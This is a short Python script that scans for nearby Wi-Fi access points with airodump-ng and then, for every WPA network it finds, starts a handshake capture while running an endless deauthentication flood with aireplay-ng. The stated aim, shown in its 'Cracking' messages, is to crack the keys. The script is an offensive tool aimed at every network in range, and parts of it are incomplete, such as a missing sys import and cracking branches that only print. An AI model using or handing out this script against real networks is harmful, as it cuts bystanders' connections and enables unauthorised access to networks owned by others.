import os
import subprocess
import time
import csv

def attack(BSSID, ESSID, ENC, channel, interface):
        os.system(f"sudo iwconfig {interface} channel {channel}")

        if "WPA" in ENC:
                print(f"[~] Cracking {ESSID}, EncType: {ENC}, CH: {channel}")

                # starting listener
                subprocess.Popen(['sudo', 'airodump-ng', '-w', 'output', '-c', channel, '--bssid', BSSID, interface])

                # starting deauth
                os.system(f"sudo aireplay-ng --deauth 0 1 -a {BSSID} {interface}")
                time.sleep(30)
        elif ENC == "WEP":
                print(f"[~] Cracking {ESSID}, EncType: {ENC}")
        else:
                print(f"[~] Cracking {ESSID}, EncType: {ENC}, CH: {channel}")



def getAPList(interface):

        os.system("rm -rf out-*.csv")
        subprocess.Popen(['sudo', 'airodump-ng', interface, '-w', 'out', '--output-format', 'csv'])

        time.sleep(10)

        os.system("sudo pkill -f airodump-ng")
        os.system("clear")

        with open('out-01.csv', newline='') as csvfile:
                reader = csv.DictReader(csvfile)
                try:
                        for row in reader:
                                if row[None][0] == "BSSID":
                                        continue
                                print(row[None][0], row[None][13])

                                channel=row[None][3]
                                enc = row[None][5]+"/"+row[None][6]+"/"+row[None][7]
                                attack(row[None][0].replace(" ", ""), row[None][13].replace(" ", ""), enc.replace(" ", ""), channel.replace(" ", ""), interface)
                except:
                        print("[x] Error while getting AP list")
                        print(sys.exc_info()[0])
                        pass

interface="wlan1mon"
getAPList(interface)
